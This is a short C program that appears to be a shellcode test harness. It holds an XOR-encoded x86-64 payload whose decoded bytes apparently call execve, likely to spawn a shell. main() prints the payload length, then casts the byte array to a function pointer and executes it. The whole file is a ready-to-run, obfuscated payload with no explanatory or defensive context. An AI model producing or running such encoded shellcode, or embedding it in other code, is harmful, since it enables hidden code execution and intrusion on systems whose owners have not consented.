#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xbe\xcd\x47\x27\x02\x12\xf0\x80\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xd4\xf6\x1f\xbe\x4a\xa9"
"\xdf\xe2\xd7\xa3\x68\x54\x6a\x12\xa3\xc8\x37\x2a\x2f\x0a\x61"
"\x12\xf0\xc8\x37\x2b\x15\xcf\x13\x12\xf0\x80\xdd\xac\x33\x07"
"\x2d\x77\x84\xe3\x91\xe2\x37\x46\x71\x61\x87\xe4\xbe\x9b\x10"
"\x6f\x8b\xf4\xff\x85";

main()
{

		printf("Shellcode Length:  %d\n", (int)strlen(code));

			int (*ret)() = (int(*)())code;

				ret();

}
